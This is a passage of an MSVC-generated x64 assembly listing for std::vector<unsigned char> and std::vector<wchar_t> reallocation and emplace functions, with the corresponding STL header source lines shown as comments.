	mov	rcx, QWORD PTR _Whereptr$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Whereoff$[rsp], rax

; 862  :         const auto _Oldsize  = static_cast<size_type>(_Mylast - _Myfirst);

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	QWORD PTR _Oldsize$[rsp], rax

; 863  : 
; 864  :         if (_Oldsize == max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::max_size
	cmp	QWORD PTR _Oldsize$[rsp], rax
	jne	SHORT $LN2@Emplace_re

; 865  :             _Xlength();

	call	?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Xlength
$LN2@Emplace_re:

; 866  :         }
; 867  : 
; 868  :         const size_type _Newsize     = _Oldsize + 1;

	mov	rax, QWORD PTR _Oldsize$[rsp]
	inc	rax
	mov	QWORD PTR _Newsize$[rsp], rax

; 869  :         const size_type _Newcapacity = _Calculate_growth(_Newsize);

	mov	rdx, QWORD PTR _Newsize$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Calculate_growth
	mov	QWORD PTR _Newcapacity$[rsp], rax

; 870  : 
; 871  :         const pointer _Newvec           = _Al.allocate(_Newcapacity);

	mov	rdx, QWORD PTR _Newcapacity$[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@E@std@@QEAAPEAE_K@Z ; std::allocator<unsigned char>::allocate
	mov	QWORD PTR _Newvec$[rsp], rax

; 872  :         const pointer _Constructed_last = _Newvec + _Whereoff + 1;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx+1]
	mov	QWORD PTR _Constructed_last$[rsp], rax

; 873  :         pointer _Constructed_first      = _Constructed_last;

	mov	rax, QWORD PTR _Constructed_last$[rsp]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 874  : 
; 875  :         _TRY_BEGIN
; 876  :         _Alty_traits::construct(_Al, _Unfancy(_Newvec + _Whereoff), _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	QWORD PTR tv87[rsp], rax
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	mov	rdx, QWORD PTR _Newvec$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	call	??$_Unfancy@E@std@@YAPEAEPEAE@Z		; std::_Unfancy<unsigned char>
	mov	rcx, QWORD PTR tv87[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char const &>

; 877  :         _Constructed_first = _Newvec + _Whereoff;

	mov	rax, QWORD PTR _Whereoff$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 878  : 
; 879  :         if (_Whereptr == _Mylast) { // at back, provide strong guarantee

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	cmp	QWORD PTR _Whereptr$[rsp], rax
	jne	SHORT $LN4@Emplace_re

; 880  :             if constexpr (is_nothrow_move_constructible_v<_Ty> || !is_copy_constructible_v<_Ty>) {
; 881  :                 _Uninitialized_move(_Myfirst, _Mylast, _Newvec, _Al);

	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, QWORD PTR _Newvec$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z ; std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >

; 882  :             } else {
; 883  :                 _Uninitialized_copy(_Myfirst, _Mylast, _Newvec, _Al);
; 884  :             }
; 885  :         } else { // provide basic guarantee

	jmp	SHORT $LN5@Emplace_re
$LN4@Emplace_re:

; 886  :             _Uninitialized_move(_Myfirst, _Whereptr, _Newvec, _Al);

	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, QWORD PTR _Newvec$[rsp]
	mov	rdx, QWORD PTR _Whereptr$[rsp]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z ; std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >

; 887  :             _Constructed_first = _Newvec;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 888  :             _Uninitialized_move(_Whereptr, _Mylast, _Newvec + _Whereoff + 1, _Al);

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx+1]
	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Whereptr$[rsp]
	call	??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z ; std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >
	npad	1
$LN5@Emplace_re:
	jmp	SHORT $LN9@Emplace_re
$LN10@Emplace_re:
$LN9@Emplace_re:

; 889  :         }
; 890  :         _CATCH_ALL
; 891  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);
; 892  :         _Al.deallocate(_Newvec, _Newcapacity);
; 893  :         _RERAISE;
; 894  :         _CATCH_END
; 895  : 
; 896  :         _Change_array(_Newvec, _Newsize, _Newcapacity);

	mov	r9, QWORD PTR _Newcapacity$[rsp]
	mov	r8, QWORD PTR _Newsize$[rsp]
	mov	rdx, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Change_array

; 897  :         return _Newvec + _Whereoff;

	mov	rax, QWORD PTR _Whereoff$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx

; 898  :     }

	add	rsp, 136				; 00000088H
	ret	0
$LN11@Emplace_re:
??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_reallocate<unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Newvec$ = 32
_Al$ = 40
_Whereoff$ = 48
_Myfirst$ = 56
_Mylast$ = 64
_Constructed_first$ = 72
_Newcapacity$ = 80
_My_data$ = 88
_Oldsize$ = 96
_Constructed_last$ = 104
_Newsize$ = 112
tv87 = 120
this$ = 144
_Whereptr$ = 152
<_Val_0>$ = 160
?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA PROC ; `std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_reallocate<unsigned char const &>'::`1'::catch$0

; 890  :         _CATCH_ALL

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z$0:

; 891  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);

	mov	r8, QWORD PTR _Al$[rbp]
	mov	rdx, QWORD PTR _Constructed_last$[rbp]
	mov	rcx, QWORD PTR _Constructed_first$[rbp]
	call	??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z ; std::_Destroy_range<std::allocator<unsigned char> >

; 892  :         _Al.deallocate(_Newvec, _Newcapacity);

	mov	r8, QWORD PTR _Newcapacity$[rbp]
	mov	rdx, QWORD PTR _Newvec$[rbp]
	mov	rcx, QWORD PTR _Al$[rbp]
	call	?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z ; std::allocator<unsigned char>::deallocate

; 893  :         _RERAISE;

	xor	edx, edx
	xor	ecx, ecx
	call	_CxxThrowException
	npad	1

; 894  :         _CATCH_END

	lea	rax, $LN10@catch$0
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA ENDP ; `std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_reallocate<unsigned char const &>'::`1'::catch$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z
_TEXT	SEGMENT
_Mylast$ = 32
_My_data$ = 40
_Result$ = 48
this$ = 80
<_Val_0>$ = 88
??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_back_with_unused_capacity<unsigned char const &>, COMDAT

; 829  :     _CONSTEXPR20 _Ty& _Emplace_back_with_unused_capacity(_Valty&&... _Val) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 830  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 831  :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 832  :         pointer& _Mylast = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 833  :         _STL_INTERNAL_CHECK(_Mylast != _My_data._Myend); // check that we have unused capacity
; 834  :         if constexpr (conjunction_v<is_nothrow_constructible<_Ty, _Valty...>,
; 835  :                           _Uses_default_construct<_Alloc, _Ty*, _Valty...>>) {
; 836  :             _ASAN_VECTOR_MODIFY(1);
; 837  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	rdx, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z ; std::_Construct_in_place<unsigned char,unsigned char const &>

; 838  :         } else {
; 839  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 840  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 841  :             _ASAN_VECTOR_RELEASE_GUARD;
; 842  :         }
; 843  : 
; 844  :         _Orphan_range(_Mylast, _Mylast);

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	r8, QWORD PTR [rax]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Orphan_range@?$vector@EV?$allocator@E@std@@@std@@AEBAXPEAE0@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Orphan_range

; 845  :         _Ty& _Result = *_Mylast;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Result$[rsp], rax

; 846  :         ++_Mylast;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	inc	rax
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rcx], rax

; 847  : 
; 848  :         return _Result;

	mov	rax, QWORD PTR _Result$[rsp]

; 849  :     }

	add	rsp, 72					; 00000048H
	ret	0
??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_back_with_unused_capacity<unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
_TEXT	SEGMENT
_Newvec$ = 32
_Al$ = 40
_Whereoff$ = 48
_Myfirst$ = 56
_Mylast$ = 64
_Constructed_first$ = 72
_Newcapacity$ = 80
_My_data$ = 88
_Oldsize$ = 96
_Constructed_last$ = 104
_Newsize$ = 112
tv90 = 120
this$ = 144
_Whereptr$ = 152
<_Val_0>$ = 160
??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t const &>, COMDAT

; 852  :     _CONSTEXPR20 pointer _Emplace_reallocate(const pointer _Whereptr, _Valty&&... _Val) {

$LN13:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 136				; 00000088H

; 853  :         // reallocate and insert by perfectly forwarding _Val at _Whereptr
; 854  :         _Alty& _Al        = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 855  :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 856  :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 857  :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 858  : 
; 859  :         _STL_INTERNAL_CHECK(_Mylast == _My_data._Myend); // check that we have no unused capacity
; 860  : 
; 861  :         const auto _Whereoff = static_cast<size_type>(_Whereptr - _Myfirst);

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Whereptr$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	sar	rax, 1
	mov	QWORD PTR _Whereoff$[rsp], rax

; 862  :         const auto _Oldsize  = static_cast<size_type>(_Mylast - _Myfirst);

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	sar	rax, 1
	mov	QWORD PTR _Oldsize$[rsp], rax

; 863  : 
; 864  :         if (_Oldsize == max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size
	cmp	QWORD PTR _Oldsize$[rsp], rax
	jne	SHORT $LN2@Emplace_re

; 865  :             _Xlength();

	call	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
$LN2@Emplace_re:

; 866  :         }
; 867  : 
; 868  :         const size_type _Newsize     = _Oldsize + 1;

	mov	rax, QWORD PTR _Oldsize$[rsp]
	inc	rax
	mov	QWORD PTR _Newsize$[rsp], rax

; 869  :         const size_type _Newcapacity = _Calculate_growth(_Newsize);

	mov	rdx, QWORD PTR _Newsize$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth
	mov	QWORD PTR _Newcapacity$[rsp], rax

; 870  : 
; 871  :         const pointer _Newvec           = _Al.allocate(_Newcapacity);

	mov	rdx, QWORD PTR _Newcapacity$[rsp]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate
	mov	QWORD PTR _Newvec$[rsp], rax

; 872  :         const pointer _Constructed_last = _Newvec + _Whereoff + 1;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2+2]
	mov	QWORD PTR _Constructed_last$[rsp], rax

; 873  :         pointer _Constructed_first      = _Constructed_last;

	mov	rax, QWORD PTR _Constructed_last$[rsp]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 874  : 
; 875  :         _TRY_BEGIN
; 876  :         _Alty_traits::construct(_Al, _Unfancy(_Newvec + _Whereoff), _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	QWORD PTR tv90[rsp], rax
	mov	rcx, QWORD PTR _Newvec$[rsp]
	mov	rdx, QWORD PTR _Whereoff$[rsp]
	lea	rcx, QWORD PTR [rcx+rdx*2]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	rcx, QWORD PTR tv90[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t const &>

; 877  :         _Constructed_first = _Newvec + _Whereoff;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 878  : 
; 879  :         if (_Whereptr == _Mylast) { // at back, provide strong guarantee

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	cmp	QWORD PTR _Whereptr$[rsp], rax
	jne	SHORT $LN4@Emplace_re

; 880  :             if constexpr (is_nothrow_move_constructible_v<_Ty> || !is_copy_constructible_v<_Ty>) {
; 881  :                 _Uninitialized_move(_Myfirst, _Mylast, _Newvec, _Al);

	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, QWORD PTR _Newvec$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >

; 882  :             } else {
; 883  :                 _Uninitialized_copy(_Myfirst, _Mylast, _Newvec, _Al);
; 884  :             }
; 885  :         } else { // provide basic guarantee

	jmp	SHORT $LN5@Emplace_re
$LN4@Emplace_re:

; 886  :             _Uninitialized_move(_Myfirst, _Whereptr, _Newvec, _Al);

	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, QWORD PTR _Newvec$[rsp]
	mov	rdx, QWORD PTR _Whereptr$[rsp]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >

; 887  :             _Constructed_first = _Newvec;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	QWORD PTR _Constructed_first$[rsp], rax

; 888  :             _Uninitialized_move(_Whereptr, _Mylast, _Newvec + _Whereoff + 1, _Al);

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2+2]
	mov	r9, QWORD PTR _Al$[rsp]
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Whereptr$[rsp]
	call	??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >
	npad	1
$LN5@Emplace_re:
	jmp	SHORT $LN9@Emplace_re
$LN10@Emplace_re:
$LN9@Emplace_re:

; 889  :         }
; 890  :         _CATCH_ALL
; 891  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);
; 892  :         _Al.deallocate(_Newvec, _Newcapacity);
; 893  :         _RERAISE;
; 894  :         _CATCH_END
; 895  : 
; 896  :         _Change_array(_Newvec, _Newsize, _Newcapacity);

	mov	r9, QWORD PTR _Newcapacity$[rsp]
	mov	r8, QWORD PTR _Newsize$[rsp]
	mov	rdx, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array

; 897  :         return _Newvec + _Whereoff;

	mov	rax, QWORD PTR _Newvec$[rsp]
	mov	rcx, QWORD PTR _Whereoff$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]

; 898  :     }

	add	rsp, 136				; 00000088H
	ret	0
$LN11@Emplace_re:
??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Newvec$ = 32
_Al$ = 40
_Whereoff$ = 48
_Myfirst$ = 56
_Mylast$ = 64
_Constructed_first$ = 72
_Newcapacity$ = 80
_My_data$ = 88
_Oldsize$ = 96
_Constructed_last$ = 104
_Newsize$ = 112
tv90 = 120
this$ = 144
_Whereptr$ = 152
<_Val_0>$ = 160
?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA PROC ; `std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t const &>'::`1'::catch$0

; 890  :         _CATCH_ALL

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z$0:

; 891  :         _Destroy_range(_Constructed_first, _Constructed_last, _Al);

	mov	r8, QWORD PTR _Al$[rbp]
	mov	rdx, QWORD PTR _Constructed_last$[rbp]
	mov	rcx, QWORD PTR _Constructed_first$[rbp]
	call	??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ; std::_Destroy_range<std::allocator<wchar_t> >

; 892  :         _Al.deallocate(_Newvec, _Newcapacity);

	mov	r8, QWORD PTR _Newcapacity$[rbp]
	mov	rdx, QWORD PTR _Newvec$[rbp]
	mov	rcx, QWORD PTR _Al$[rbp]
	call	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate

; 893  :         _RERAISE;

	xor	edx, edx
	xor	ecx, ecx
	call	_CxxThrowException
	npad	1

; 894  :         _CATCH_END

	lea	rax, $LN10@catch$0
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA ENDP ; `std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t const &>'::`1'::catch$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z
_TEXT	SEGMENT
_Mylast$ = 32
_My_data$ = 40
_Result$ = 48
this$ = 80
<_Val_0>$ = 88
??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t const &>, COMDAT

; 829  :     _CONSTEXPR20 _Ty& _Emplace_back_with_unused_capacity(_Valty&&... _Val) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 830  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 831  :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 832  :         pointer& _Mylast = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 833  :         _STL_INTERNAL_CHECK(_Mylast != _My_data._Myend); // check that we have unused capacity
; 834  :         if constexpr (conjunction_v<is_nothrow_constructible<_Ty, _Valty...>,
; 835  :                           _Uses_default_construct<_Alloc, _Ty*, _Valty...>>) {
; 836  :             _ASAN_VECTOR_MODIFY(1);
; 837  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	rdx, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z ; std::_Construct_in_place<wchar_t,wchar_t const &>

; 838  :         } else {
; 839  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 840  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 841  :             _ASAN_VECTOR_RELEASE_GUARD;
; 842  :         }
; 843  : 
; 844  :         _Orphan_range(_Mylast, _Mylast);

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	r8, QWORD PTR [rax]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range

; 845  :         _Ty& _Result = *_Mylast;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Result$[rsp], rax

; 846  :         ++_Mylast;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rax, QWORD PTR [rax]
	add	rax, 2
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rcx], rax

; 847  : 
; 848  :         return _Result;

	mov	rax, QWORD PTR _Result$[rsp]

; 849  :     }

	add	rsp, 72					; 00000048H
	ret	0
??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z
_TEXT	SEGMENT
tv79 = 32
_Proxy$ = 33
_Stay_small$ = 34
_My_data$ = 40
$T1 = 48
$T2 = 50
_New_ptr$ = 56
_New_capacity$ = 64
_Alproxy$ = 72
_Al$ = 80
this$ = 112
_Arg$ = 120
_Count$ = 128
